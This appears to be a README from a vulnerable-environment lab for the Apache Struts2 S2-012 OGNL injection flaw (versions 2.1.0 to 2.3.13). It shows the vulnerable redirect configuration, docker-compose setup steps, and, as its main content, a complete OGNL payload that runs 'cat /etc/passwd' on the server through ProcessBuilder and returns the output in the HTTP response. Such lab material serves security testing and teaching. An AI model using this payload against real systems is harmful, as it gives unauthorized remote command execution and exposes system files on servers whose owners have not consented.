# S2-012 Remote Code Execution Vulnerablity

[中文版本(Chinese version)](README.zh-cn.md)

Affected Version: 2.1.0 - 2.3.13

Details: http://struts.apache.org/docs/s2-012.html

## Reference

If the redirect type is used when configuring `result` in the `action`, and ${param_name} is also used as the redirect variable, for example:

```xml
<package name="S2-012" extends="struts-default">
    <action name="user" class="com.demo.action.UserAction">
        <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
        <result name="input">/index.jsp</result>
        <result name="success">/index.jsp</result>
    </action>
</package>
```

During the redirection process, struts2 performs an OGNL expression parsing on the value of the `name` parameter, so that OGNL expression can be inserted to cause the command execution.

## Setup

```
docker-compose build
docker-compose up -d
```

## Exploit

We can use s2-001's POC directly:

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

Result：

![](1.png)
